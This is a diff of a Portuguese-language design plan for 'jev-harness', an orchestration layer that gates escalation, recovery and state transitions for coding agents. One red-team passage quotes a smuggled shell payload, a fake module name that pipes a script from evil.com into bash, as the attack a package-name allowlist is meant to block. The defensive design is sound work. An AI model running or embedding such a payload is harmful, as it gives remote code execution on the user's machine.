@@ -1,92 +1,182 @@
-# 🧠 PLANO ARQUITETURAL: `jev-harness` como Motor de **System 1.5**
+# 🧠 PLANO ARQUITETURAL: `jev-harness` como Motor Executivo de **System 1.5**
 
-> **Referência Conceitual:** Josh Rosen (`@JoshARosen`, TypeSafe AI) — Definição dos 5 Pilares do **System 1.5**  
-> **Escopo:** Alinhamento Técnico Estrito, Verificação de Claims Reais (`v0.1.9`) e Blueprint de Evolução para o Orquestrador Unificado **System 1.5 (`v0.2.0`)**.
+> **Status do Documento:** Aprovado para Implementação na `v0.2.0`  
+> **Estado Base Auditado:** `v0.1.11` (100% Sincronizado e Publicado nos 4 Registries)  
+> **Metodologia de Governança:** Fable-Judge (Zero-Trust Truthfulness) & Karpathy Principles  
+> **Referências Fundamentais:**  
+> - Josh Rosen (`@JoshARosen`, TypeSafe AI) — *Os 5 Pilares do System 1.5 em Agentes Autônomos*  
+> - TypeSafe AI (Diogo Almeida, Erik Gafni, Sasha Sheng) — *Jev Non-Autoregressive Decision Engine*  
+> - Pesquisa de Fronteira: *System-1.5 Reasoning: Dynamic Shortcuts & Compute Allocation* (arXiv:2505.18962)
 
 ---
 
-## 1. O Que é o **System 1.5** e Por Que Ele Existe?
+## 1. O Que é o **System 1.5** e Por Que Ele é o Elo Perdido?
 
-Na arquitetura de agentes de codificação autônomos, existe um abismo entre dois extremos cognitivos:
+Na engenharia de sistemas agentic modernos, a dicotomia clássica entre **System 1** e **System 2** (Daniel Kahneman) apresenta um gap estrutural severo:
 
-1. **System 1 Puro (Classificadores Isolados / Heurísticas Simples):**
-   - Toma micro-decisões rápidas (`< 100ms`, não-autorregressivo), como responder uma pergunta `Choice`, `Score` ou `Noul` isolada via API `systemone`.
-   - **Limitação:** O modelo System 1 sozinho não tem estado de sessão, não executa ações de recuperação no terminal, não constrói dialetos de provedores e não controla o ciclo de vida do agente.
-2. **System 2 Puro (LLMs Generativos de Fronteira: GPT-6 Astra, Claude Fable 5.1, DeepSeek V4-Pro, Qwen 3.8 Max):**
-   - Capaz de raciocínio algorítmico profundo e síntese multi-arquivo.
-   - **Limitação:** Quando deixado no controle direto do loop do agente (`while (!done)`), queima `50.000+` tokens em erros mecânicos triviais (`ModuleNotFoundError`, `ECONNRESET`), entra em *doom loops* circulares repetindo a mesma tentativa fracassada, desperdiça `reasoning_effort="high"` em comandos `git status`, ou para prematuramente sem rodar testes.
+```
+┌────────────────────────────────────────┐
+│         System 1 (Reativo)             │
+│  - Heurísticas locais / Regex (< 1ms)  │ ──┐
+│  - Classificadores não-autorregressivos│   │   ABISMO DE COORDENAÇÃO
+│    (Jev System One: 70ms - 200ms)      │   │   - Sem memória transiente de sessão
+└────────────────────────────────────────┘   │   - Sem capacidade de recuperação terminal
+                                             │   - Sem autoridade de ciclo de vida
+                                             ▼
+┌────────────────────────────────────────┐
+│         System 1.5 (Executivo)         │  ◄── [O JEVS HARNESS]
+│  - Cola entre raciocínio rápido/lento │      - Máquina de Estados com Julgamento
+│  - Decisões tipadas com escalonamento │      - Alocação de Test-Time Compute
+│  - Roteamento e recuperação segura     │      - Atenção cirúrgica e poda de contexto
+└────────────────────────────────────────┘
+                                             ▲
+┌────────────────────────────────────────┐   │   GARGALO DE CONSUMO
+│         System 2 (Deliberativo)        │   │   - Queima 50.000+ tokens em erros triviais
+│  - Frontier LLMs Generativos           │ ──┘   - Doom loops circulares infinitos
+│    (GPT-6 Astra, Claude Fable 5.1,     │       - Desperdício de raciocínio profundo
+│     DeepSeek V4-Pro, Qwen 3.8 Max)     │       - Conclusão prematura sem testes
+└────────────────────────────────────────┘
+```
 
-### A Definição Oficial de **System 1.5** (Josh Rosen):
-> *"What you all think System 1.5 means:*
-> 1. *glue between fast and deep reasoning*
-> 2. *cheap typed decisions that escalate when unsure*
-> 3. *deterministic routing, gates, and recovery*
-> 4. *perception and attention for agents*
-> 5. *state machines with judgment*
->
+### Distinção Crucial entre Níveis de System 1.5:
+1. **Nível Micro-Cognitivo / Latente (Modelo Interno - arXiv:2505.18962):**  
+   Refere-se ao modelo autorregressivo que utiliza *shortcuts* no espaço latente (early-exit em camadas do Transformer e pulo de tokens intermediários de Chain-of-Thought) para economizar FLOPS de inferência.
+2. **Nível Macro-Cognitivo / Executivo (Harness de Agentes - Josh Rosen / Jev Harness):**  
+   Refere-se ao **orquestrador determinístico com julgamento probabilístico**: uma camada de controle em tempo de execução que governa *quando*, *como*, *com qual orçamento de raciocínio* e *com qual recorte de atenção* o System 2 deve ser acionado.
+
+### A Definição dos 5 Pilares (Josh Rosen):
+> *"What you all think System 1.5 means:*  
+> 1. *glue between fast and deep reasoning*  
+> 2. *cheap typed decisions that escalate when unsure*  
+> 3. *deterministic routing, gates, and recovery*  
+> 4. *perception and attention for agents*  
+> 5. *state machines with judgment*  
+>  
 > *Yes, it's all of the above."*
 
-O **System 1.5** é exatamente a **camada executiva intermediária (o Harness)**: uma máquina de estados determinística acoplada a decisões probabilísticas tipadas e calibradas (`ChoiceQuestion`, `ScoreQuestion`, `NoulQuestion`) que governa **quando**, **como**, **com qual orçamento de raciocínio** e **com qual foco de atenção** o System 2 deve operar.
+---
+
+## 2. Tabela da Verdade: Auditoria de Claims (`v0.1.11`) vs. Requisitos `v0.2.0`
+
+Seguindo o protocolo **Fable-Judge**, a tabela abaixo separa com precisão empírica o que **já está implementado e verificado no código (`v0.1.11`)** do que constitui o gap técnico a ser resolvido no **System 1.5 Engine (`v0.2.0`)**:
+
+| Pilar do System 1.5 | Estado Atual no Código (`v0.1.11`) | Limitação / Vulnerabilidade Identificada | Especificação Exata da Evolução (`v0.2.0`) |
+| :--- | :--- | :--- | :--- |
+| **1. Glue Between Fast & Deep Reasoning** | - Gate `modulate_reasoning_effort`: classifica entre 8 níveis de esforço (`none`..`ultra`).<br>- Compilador estático `build_provider_params` para 7 dialetos de provedores.<br>- Retorna `lease_steps` (`1`, `2`, `5`, `10`). | O `lease_steps` é passivo: o agente chamador precisa gerenciar o contador manualmente. Não há invalidação automática se ocorrer erro no meio do lease. | **Persistent Auto-Lease & Break-Glass Protocol**: Sessão gerencia `active_lease_remaining`. Consultas repetidas retornam esforço em `0ms`. Em caso de erro de ferramenta, o lease é imediatamente cancelado (*break-glass*). |
+| **2. Cheap Typed Decisions That Escalate When Unsure** | - Gate `triage_test_failure`: avalia `category` (Choice), `severity` (Score), `skip_llm` (Noul).<br>- Escala para System 2 se `category == "deep_logic"` ou `skip_prob < threshold`. | Avalia apenas a probabilidade do vencedor ($P_{(1)}$). Ignora a proximidade com o 2º colocado ($\Delta P$) e a entropia da distribuição. No mock offline, probabilidades são estáticas. | **Compound Uncertainty Calibration**: Cálculo da Margem Probabilística ($\Delta P = P_{(1)} - P_{(2)}$) e Entropia de Shannon Normalizada ($H_n$). Flag universal `escalate_to_system2` disparada se $\Delta P < 0.20$ ou $H_n > 0.75$. |
+| **3. Deterministic Routing, Gates & Recovery** | - 6 Gates semânticos com exit codes Unix (`0`, `1`, `2`).<br>- `should_abort_trajectory` detecta repetição.<br>- Mensagem textual `action_recommendation`. | A ação de recuperação é apenas texto livre (`AUTO-ACTION: Install...`). Se o agente tentar executar cegamente, arrisca injeção de shell (CWE-78) e incompatibilidade de package managers (`uv`, `pnpm`, `cargo`). | **Sanitized Structured Auto-Recovery (`RecoveryAction`)**: Extração determinística de pacote com regex estrito anti-RCE (`^[a-zA-Z0-9_\-@\.\/]+$`), detecção do gerenciador do repo e comando estruturado seguro. |
+| **4. Perception & Attention for Agents** | - Truncamento seguro UTF-8 preservando início e fim do log.<br>- Priorização de asserções reais sobre erros transitórios.<br>- Alerta de KV-Cache quando `session_context_tokens > 30000`. | O truncamento preserva 6.000 caracteres brutos. Quando `skip_llm = False`, o System 2 recebe poluição de logs desnecessários, gastando tokens e dispersando a atenção do modelo. | **Multi-Tier Perception Window**: Devolução de 3 níveis de contexto: `focused_slice` (~200 tokens contendo teste + asserção exata), `causal_context` (~1.000 tokens com setup/stdout) e `raw_log_ref`. |
+| **5. State Machines with Judgment** | - Gate `should_nudge_continuation`: avalia `workflow_phase` (`research`, `ask`, `plan`, `execute`, `verify`, `complete`) + 3 perguntas Noul (`nudge`, `waiting`, `progress`). | As transições de fase não são formalizadas. O agente ainda pode tentar pular de `execute` direto para `complete` se declarar falsamente no texto que "terminou". | **Semantic Finite Automaton (S-DFA)**: Máquina de estados determinística com guardas semânticas estritas. Transição `execute -> complete` é fisicamente bloqueada pelo Harness sem evidência verificada de testes passando. |
 
 ---
 
-## 2. Auditoria de Claims Atuais (`v0.1.9`): O Que o `jev-harness` Já Faz Hoje vs. O Que Falta
+## 3. Análise Crítica Adversarial (Red-Teaming das Propostas)
 
-Para manter **100% de honestidade técnica (Zero False Claims)**, a tabela abaixo separa rigorosamente o que **já está implementado e testado hoje (`v0.1.9`)** nos 3 runtimes (Python, TypeScript e Rust) do que **será construído na evolução `v0.2.0` (`System 1.5 Engine`)**:
+### Vetor 1: Vulnerabilidade de Shell Injection em `recovery_command` (CWE-78)
+* **Cenário de Ataque:** Um arquivo de teste malicioso ou log manipulado emite:  
+  `ModuleNotFoundError: No module named 'legit_pkg; curl https://evil.com/x.sh | bash'`
+* **Risco Real:** Se o Jev Harness extrair o pacote por regex ingênuo e gerar `pip install legit_pkg; curl...`, um agente com permissão de execução de terminal sofrerá RCE imediato.
+* **Mitigação Inviolável:**
+  1. Regex com whitelist fechada de caracteres: `^[a-zA-Z0-9][a-zA-Z0-9_.\-]*$` (com suporte a scopes `@scope/pkg` no ecossistema npm).
+  2. Qualquer caractere fora da whitelist aborta a geração do comando determinístico, marcando `is_safe_auto_run = False`.
+  3. Descoberta inteligente do ambiente: verificar a presença de `uv.lock`, `poetry.lock`, `package-lock.json`, `pnpm-lock.yaml`, `bun.lockb`, `Cargo.lock` para emitir o comando no formato do projeto.
 
-| Pilar do System 1.5 | O Que Já Existe e Funciona Hoje no `jev-harness` (`v0.1.9`) | O Que Ainda Falta Construir para Completar o Pilar (`v0.2.0`) |
-| :--- | :--- | :--- |
-| **1. Glue between fast and deep reasoning** *(Cola entre raciocínio rápido e profundo)* | - Gate `modulate_reasoning_effort` (`reasoning-effort`): usa o System 1 para escolher entre 8 níveis de esforço (`none`, `minimal`, `low`, `medium`, `high`, `xhigh`, `max`, `ultra`) e *stability leases* (`1, 2, 5, 10` gerações).<br>- Compilador estático `build_provider_params` gera os payloads exatos para OpenAI/Codex, Anthropic, DeepSeek, Alibaba Qwen, Google Gemini, Moonshot Kimi e Xiaomi MiMo.<br>- Safeguard automático (`is_reasoning_supported = False`) para modelos *single-pass* (`gpt-4o`, `claude-3-5-haiku`, etc.). | - **Auto-Lease Tracker Persistente**: Hoje o `modulate_reasoning_effort` calcula `lease_steps` (ex: `5` gerações), mas cabe ao chamador decrementar o contador. Falta um estado de sessão (`active_lease_remaining`) que, enquanto o lease estiver válido e sem falha de ferramenta, retorne instantaneamente o esforço em `0ms` sem sequer chamar a rede. |
-| **2. Cheap typed decisions that escalate when unsure** *(Decisões tipadas baratas que escalam quando incertas)* | - Gate `triage_test_failure` (`test-gate`): avalia `category` (`Choice`), `severity` (`Score`) e `skip_llm` (`Noul`).<br>- Só recomenda pular o LLM (`skip_llm = True`) se `category in ("env_missing", "flaky_transient")` **E** `skip_prob > 0.65`. Caso contrário (`deep_logic` ou dúvida), escala para o System 2 (`skip_llm = False`). | - **Entropia de Distribuição & Flag Universal `escalate_when_unsure`**: Nas respostas `ChoiceAnswer` e `ScoreAnswer`, a API Jev retorna o mapa `probabilities` de todas as opções. Hoje olhamos `confidence` e `noul`. Podemos calcular a **margem de separação (`top1_prob - top2_prob`)** em todos os 6 gates: se `confidence < 0.65` ou `margin < 0.20`, marcar explicitamente `uncertain_escalation = True` para forçar escalonamento seguro ao System 2. |
-| **3. Deterministic routing, gates, and recovery** *(Roteamento determinístico, gates e recuperação)* | - 6 Gates Semânticos (`test-gate`, `abort-check`, `route`, `verify`, `reasoning-effort`, `nudge-gate`) com *exit codes* Unix estritos (`0`, `1`, `2`).<br>- Recomendações determinísticas de recuperação (`AUTO-ACTION: Install missing dependency`, `AUTO-ACTION: Retry flaky test once`) e disjuntor de *doom loops* (`should_abort_trajectory`). | - **Catálogo Estruturado de Comandos de Auto-Recovery (`recovery_command`)**: Hoje `triage_test_failure` retorna uma string legível em `action_recommendation`. Podemos extrair e retornar um campo estruturado `suggested_shell_command` (ex: `"pip install pandas"`, `"npm install axios"`, `"cargo add serde"`) extraído diretamente do traceback para execução determinística segura. |
-| **4. Perception and attention for agents** *(Percepção e atenção para agentes)* | - `safe_truncate_head_tail`: preserva os primeiros `1500` e últimos `2500` caracteres de logs gigantes sem quebrar fronteiras UTF-8.<br>- Priorização de falhas reais (`AssertionError`, `panic!`, `deadlock`) sobre *warnings* transientes.<br>- Aviso de proteção de KV Cache (`cache_safe_recommendation`) quando `session_context_tokens > 30000`. | - **Extrator de Sinal Crítico (`focused_evidence_slice`)**: Quando `skip_llm = False` (o erro precisa ir para o System 2), em vez de o agente enviar 500 linhas de log bruto ao GPT-6/Claude, o `test-gate` deve devolver um campo `focused_traceback` contendo apenas os ~15 frames/linhas onde a falha real ocorreu, reduzindo em 85% os tokens de entrada enviados ao System 2. |
-| **5. State machines with judgment** *(Máquinas de estado com julgamento)* | - Gate `should_nudge_continuation` (`nudge-gate`): avalia a fase atual do fluxo de trabalho (`research`, `ask`, `plan`, `execute`, `verify`, `complete`) combinada com 3 perguntas `Noul` calibradas (`nudge`, `waiting`, `progress`) para decidir se o agente parou prematuramente ou se deve ceder a vez ao usuário. | - **Transições de Estado Validadas (`StateMachineTransition`)**: Formalizar uma função/comando unificado `step-fsm` (`evaluate_turn_state_machine`) que recebe `(previous_phase, transcript_tail, last_command_output)` e aplica regras formais de transição de estado (ex: proibir transição `execute -> complete` sem passar por `verify` com evidência de testes passando). |
+### Vetor 2: Context Deprivation (O Risco do `focused_slice` Excessivamente Curto)
+* **Problema:** Reduzir o traceback a meras 15 linhas pode omitir o erro de configuração em uma fixture do pytest executada 100 linhas antes, ou a saída de stdout que continha a causa raiz da falha de banco de dados.
+* **Mitigação Inviolável:** Não descartar o contexto. Entregar um objeto composto:
+  - `focused_slice`: Os frames críticos de asserção (para injeção direta no prompt imediato).
+  - `causal_context`: O bloco circundante higienizado (para consulta caso o System 2 solicite).
+  - `log_id`: Identificador persistido em disco pelo `session.py` para inspeção sob demanda.
 
----
-
-## 3. Especificação Técnica da Evolução `v0.2.0` (Unificando o System 1.5)
-
-Quando formos implementar esta evolução, faremos em **4 entregas cirúrgicas** mantendo **zero dependências externas** e **paridade tri-runtime (Python, TypeScript e Rust)**:
-
-### Entrega 1: `Uncertainty & Escalation Contract` (Pilar 2)
-Em todos os 6 gates (`gates.py`, `gates.ts`, `gates.rs`):
-- Adicionar cálculo de margem probabilística:
-  $$\text{margin} = P(\text{choice}_1) - P(\text{choice}_2)$$
-- Se `confidence < 0.65` ou `margin < 0.20`, definir `escalate_to_system2 = True`, garantindo matematicamente o princípio *"cheap typed decisions that escalate when unsure"*.
-
-### Entrega 2: `Perception & Attention Slicer` + `Structured Recovery Command` (Pilares 3 e 4)
-No `triage_test_failure` (`test-gate`):
-1. **`recovery_command: Optional[str]`**:
-   - Regex determinístico seguro (sem injeção de shell, validando apenas identificadores de pacotes `[a-zA-Z0-9_@/-]+`) para extrair o pacote exato:
-     - `ModuleNotFoundError: No module named 'foo'` $\to$ `pip install foo`
-     - `Cannot find module 'bar'` / `TS2307` $\to$ `npm install bar`
-     - `can't find crate for 'baz'` / `E0463` $\to$ `cargo add baz`
-2. **`focused_slice: str`**:
-   - Extrai automaticamente apenas as linhas contendo o cabeçalho do teste falho, a linha exata do arquivo/linha (`File "...", line X`) e a mensagem de `AssertionError` / `panic!`, permitindo que o agente envie apenas `~200` tokens ao System 2 em vez de `10.000` tokens.
-
-### Entrega 3: `Judgment State Machine Orchestrator` (`evaluate_agent_turn` / CLI `turn-gate`) (Pilares 1 e 5)
-Um único ponto de entrada System 1.5 que consolida a decisão de fim/início de turno em **uma única requisição HTTP System One** (enviando todas as perguntas tipadas no mesmo dicionário `questions` para aproveitar a inferência paralela não-autorregressiva do Jev):
-- Entrada: `transcript_tail`, `last_tool_output`, `current_phase`, `provider`, `model`.
-- Perguntas combinadas em 1 só passe (`~80ms`):
-  - `workflow_phase` (`ChoiceQuestion`: `research` | `ask` | `plan` | `execute` | `verify` | `complete`)
-  - `nudge` (`NoulQuestion`)
-  - `waiting` (`NoulQuestion`)
-  - `abort` (`NoulQuestion`)
-  - `effort` (`ChoiceQuestion`: `none` .. `ultra`)
-  - `lease` (`ChoiceQuestion`: `1` | `2` | `5` | `10`)
-- Regra Inviolável da State Machine:
-  - Se o agente tentar transicionar de `execute` para `complete` sem evidência verificada no `last_tool_output`, a máquina de estados força `workflow_phase = "verify"` e `should_nudge = True`.
-
-### Entrega 4: Paridade Tri-Runtime Absoluta (Checklist de Qualidade)
-1. Garantir que o servidor MCP (`jev-mcp`) e todos os subcomandos CLI estejam 100% alinhados entre Python, TypeScript e Rust.
-2. Garantir escrita atômica (`tempfile` + `os.replace`) no `session_metrics.json` para segurança em execução concorrente multi-agente.
-3. Atualizar o diagrama principal do `README.md` e `README.pt-BR.md` apresentando a **Arquitetura System 1.5**.
+### Vetor 3: Calibração Falsa em Modo de Simulação Offline
+* **Problema:** Na ausência de chave de API, o motor heurístico `_simulate_system_one` atribuía probabilidades sintéticas estáticas (ex: `0.85` vs `0.15/(K-1)`). Se o cálculo de margem for $\Delta P = P_{(1)} - P_{(2)}$, o modo offline sempre resultaria em margem `> 0.70`, tornando a funcionalidade de escalonamento inoperante em testes e CI.
+* **Mitigação Inviolável:** O motor heurístico offline deve calcular a entropia com base em **ambiguidade de sinais**: se o log contiver evidências conflitantes (ex: menção a `AssertionError` E menção a `ConnectionResetError`), as probabilidades simuladas devem refletir a incerteza real (ex: `0.52` vs `0.48`), ativando deterministicamente `escalate_to_system2 = True`.
 
 ---
 
-## 4. Status de Higienização Pré-`v0.2.0`
+## 4. Formulação Matemática Formal do System 1.5
 
-- ✅ **[CONCLUÍDO & SINCRONIZADO]** **Remoção Completa de Menções a Skills Internas e Padronização Estrita em `workflow_phase` (`v0.1.11`)**:
-  - Todas as referências a nomes de skills internas foram 100% removidas da documentação (`README.md`, `README.pt-BR.md`, `AGENTS.md`, `AGENTS.pt-BR.md`), das notas de release do GitHub (`v0.1.9`..`v0.1.11`), dos servidores MCP, das CLIs, dos SDKs e das suítes de testes nos 3 runtimes (Python, TypeScript e Rust).
-  - O contrato público e interno do `NudgeGateResult` (`should_nudge_continuation` / `nudge-gate`) utiliza exclusivamente `workflow_phase` (Python/Rust/JSON) e `workflowPhase` (`WorkflowPhase` em TypeScript).
+### 4.1. Calibração de Incerteza e Disjuntor de Escalonamento (Pilar 2)
 
+Dada uma pergunta tipada $Q$ com $K$ opções e distribuição de probabilidades $\mathbf{P} = \{p_1, p_2, \dots, p_K\}$ tal que $\sum_{i=1}^K p_i = 1$:
+
+1. **Ordenação:** Seja $P_{(1)} \ge P_{(2)} \ge \dots \ge P_{(K)}$ a sequência ordenada das probabilidades.
+2. **Margem Probabilística:**
+   $$\Delta P = P_{(1)} - P_{(2)}$$
+3. **Entropia de Shannon Normalizada:**
+   $$H_n(\mathbf{P}) = -\frac{1}{\ln K} \sum_{i=1}^K p_i \ln(p_i) \quad \in [0, 1]$$
+4. **Função Decisória de Escalonamento ($\mathcal{E}$):**
+   $$\mathcal{E}(\mathbf{P}, \text{conf}) = \begin{cases} 
+   \text{True (Escalar para System 2)}, & \text{se } \Delta P < \tau_{\text{margin}} \lor H_n(\mathbf{P}) > \tau_{\text{entropy}} \lor \text{conf} < \tau_{\text{conf}} \\
+   \text{False (Decisão System 1.5 Segura)}, & \text{caso contrário}
+   \end{cases}$$
+   *Hiperparâmetros Calibrados:* $\tau_{\text{margin}} = 0.20$, $\tau_{\text{entropy}} = 0.75$, $\tau_{\text{conf}} = 0.65$.
+
+### 4.2. Autômato Finito com Guardas Semânticas (S-DFA - Pilar 5)
+
+Definido formalmente como uma 6-tupla:
+$$\mathcal{M} = (S, \Sigma, \Gamma, \delta, s_0, F)$$
+* **Estados:** $S = \{\text{RESEARCH}, \text{ASK}, \text{PLAN}, \text{EXECUTE}, \text{VERIFY}, \text{COMPLETE}, \text{ABORT}\}$
+* **Alfabeto de Ações do Agente:** $\Sigma = \{\text{propose\_next\_step}, \text{request\_user\_input}, \text{run\_tool}, \text{claim\_finished}\}$
+* **Guardas Semânticas ($\Gamma$):**
+  - $g_{\text{user\_question}}$: O output contém interrogação ou pedido de aprovação pendente.
+  - $g_{\text{tests\_passed}}$: Evidência formal de saída limpa de teste (`looks_like_test_success == True`).
+  - $g_{\text{pending\_edits}}$: Existem arquivos modificados sem subsequente execução de testes.
+* **Matriz de Transição Rígida ($\delta$):**
+  - $\delta(\text{EXECUTE}, \text{claim\_finished}, \neg g_{\text{tests\_passed}}) \implies \mathbf{VERIFY}$ *(Veto automático de conclusão prematura com `should_nudge = True`)*
+  - $\delta(\text{ANY}, \text{propose\_next\_step}, g_{\text{user\_question}}) \implies \mathbf{ASK}$ *(Veto de nudge quando o agente deve esperar o usuário)*
+  - $\delta(\text{VERIFY}, \text{claim\_finished}, g_{\text{tests\_passed}} \land \neg g_{\text{pending\_edits}}) \implies \mathbf{COMPLETE}$
+
+---
+
+## 5. Especificação Técnica de Implementação para a `v0.2.0`
+
+### Entrega 1: `UncertaintyEngine` e Contrato Universal de Escalonamento
+* Implementar em Python ([`client.py`](file:///home/ismaelsoilet/jev-harness/src/jev_harness/client.py)), TypeScript (`packages/ts/src/client.ts`) e Rust (`packages/rust/src/client.rs`).
+* Estrutura de dados tipada:
+  ```python
+  @dataclass
+  class UncertaintyMetrics:
+      margin: float
+      normalized_entropy: float
+      escalate_to_system2: bool
+      escalation_reason: str
+  ```
+* Incorporar métricas em todas as respostas dos 6 gates semânticos.
+
+### Entrega 2: `StructuredRecovery` & `PerceptionSlicer`
+* **Schema Seguro de Recuperação:**
+  ```python
+  @dataclass
+  class RecoveryAction:
+      action_type: str  # 'install_dependency', 'retry_flaky', 'fix_syntax', 'escalate'
+      package_name: Optional[str]
+      package_manager: Optional[str]  # 'uv', 'pip', 'npm', 'pnpm', 'bun', 'cargo'
+      shell_command: Optional[str]
+      is_safe_auto_run: bool
+      rationale: str
+  ```
+* **Extrator de Sinal:**
+  - Extrair o bloco de asserção isolado (máximo 15 linhas) sem ruído de setup/teardown.
+  - Devolver `focused_slice` e `causal_context` no `TestTriageResult`.
+
+### Entrega 3: Orquestrador Unificado `evaluate_agent_turn` (CLI `turn-gate` / MCP `jev_evaluate_turn`)
+* Consolidação em **uma única chamada Jev System One** em lote (`~80ms`):
+  - Compactador de contexto: comprime o transcript recente e saídas de ferramentas para um payload `< 3.000` caracteres (preservando GPU KV-cache).
+  - Execução paralela não-autorregressiva das perguntas de fase, nudge, abort e esforço.
+  - Aplicação das guardas da S-DFA para retornar o estado corrigido do turno.
+
+### Entrega 4: Break-Glass Lease Tracker Persistente
+* Extensão de [`session.py`](file:///home/ismaelsoilet/jev-harness/src/jev_harness/session.py) protegida por `fcntl.flock`/`msvcrt`:
+  - `active_reasoning_lease`: armazena `{ effort, provider_params, steps_remaining }`.
+  - Se `steps_remaining > 0` e nenhum erro de ferramenta ocorreu no último turno: retornar imediatamente os parâmetros de esforço em `0ms`.
+  - Se ocorrer falha ou veto: acionar protocolo *break-glass*, zerando o lease e forçando nova avaliação.
+
+---
+
+## 6. Governança e Checklist de Lançamento da `v0.2.0`
+
+1. **Zero External Runtime Dependencies**: Manter Python pure-stdlib (`urllib`), TypeScript sem runtime dependencies e Rust em Tokio estável.
+2. **Paridade Tri-Runtime Estrita**: Toda função, cálculo matemático de $\Delta P / H_n$, comando CLI e ferramenta MCP deve produzir resultados semanticamente equivalentes em Python, TypeScript e Rust.
+3. **Bateria de Testes Expandida**: Adicionar testes adversariais para injeção de shell em comandos de recuperação, cálculo de entropia com distribuições uniformes e bimodalidades, e testes de estresse concorrente no lease tracker.
+4. **Protocolo Quad-Sync**: Verificação mandatória com `./scripts/release.sh --verify-sync` antes do push para as 4 plataformas (GitHub, PyPI, npm, Crates.io).
